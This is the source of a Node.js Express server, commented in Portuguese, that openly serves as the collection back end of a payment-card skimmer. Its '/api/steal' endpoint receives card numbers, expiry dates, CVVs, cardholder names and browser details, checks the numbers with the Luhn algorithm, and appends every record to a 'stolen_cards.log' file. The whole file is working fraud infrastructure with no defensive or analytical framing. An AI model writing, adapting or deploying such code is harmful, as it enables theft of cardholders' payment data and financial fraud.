const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

// Middleware para servir arquivos estáticos (a página do skimmer)
app.use(express.static('public'));

// Middleware para parser de JSON
app.use(express.json());

// Caminho para o arquivo de log
const LOG_FILE = path.join(__dirname, 'stolen_cards.log');

// Algoritmo de Luhn para validação de número de cartão
function luhnCheck(num) {
    let sum = 0;
    let isEvenPosition = false;
    for (let i = num.length - 1; i >= 0; i--) {
        let d = parseInt(num.charAt(i), 10);
        if (isEvenPosition) {
            d *= 2;
            if (d > 9) d -= 9;
        }
        sum += d;
        isEvenPosition = !isEvenPosition;
    }
    return (sum % 10 === 0);
}

// Endpoint para receber os dados roubados
app.post('/api/steal', (req, res) => {
    const { card_number, expiry, cvv, name, referrer, user_agent, timestamp } = req.body;
    
    // Limpeza: remove espaços, hífens e formatação
    const cleanCard = String(card_number || '').replace(/[^0-9]/g, '');
    
    // Validação básica
    if (cleanCard.length < 13 || cleanCard.length > 19) {
        return res.status(400).json({ status: 'error', message: 'Invalid card length' });
    }

    if (!luhnCheck(cleanCard)) {
        // Cartão inválido, mas ainda assim registramos para análise (pode ser um erro de digitação)
        logData({ cleanCard, expiry, cvv, name, referrer, user_agent, timestamp, valid: false });
        return res.status(200).json({ status: 'success', luhn: false });
    }

    // Cartão válido
    logData({ cleanCard, expiry, cvv, name, referrer, user_agent, timestamp, valid: true });
    res.status(200).json({ status: 'success', luhn: true });
});

function logData(data) {
    const logEntry = `
========================================
[${data.timestamp}] - VALID: ${data.valid}
CARD: ${data.cleanCard.substring(0, 4)} ${data.cleanCard.substring(4, 8)} ${data.cleanCard.substring(8, 12)} ${data.cleanCard.substring(12)}
BIN:  ${data.cleanCard.substring(0, 6)}
EXP:  ${data.expiry}
CVV:  ${data.cvv}
NAME: ${data.name}
REF:  ${data.referrer || 'N/A'}
UA:   ${data.user_agent || 'N/A'}
========================================
`;
    
    fs.appendFile(LOG_FILE, logEntry, (err) => {
        if (err) console.error('Erro ao gravar log:', err);
    });
}

app.listen(PORT, () => {
    console.log(`Skimmer rodando em http://localhost:${PORT}`);
    console.log(`Logs sendo salvos em: ${LOG_FILE}`);
});